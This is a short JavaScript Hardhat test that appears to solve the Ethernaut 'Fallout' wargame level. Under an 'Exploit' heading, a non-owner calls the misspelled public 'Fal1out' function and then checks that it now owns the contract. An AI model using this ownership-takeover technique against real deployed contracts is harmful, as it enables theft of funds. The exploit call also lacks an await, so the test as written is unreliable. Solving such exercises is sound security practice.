  const { expect } = require("chai");
  
  describe("Fallout", function () {

    let contract;
    let owner;

    this.beforeEach(async () => {
        [owner, user] = await ethers.getSigners();

        const Fallout = await ethers.getContractFactory("Fallout");
        contract = await Fallout.connect(owner).deploy();
    })

    describe("Exploit", function () {
      it("Should get claim ownership of the contract ", async function () {
        contract.connect(user).Fal1out({
            value: 4
        })

        expect(await contract.owner()).to.be.eq(user.address)
      });
    });
  });
  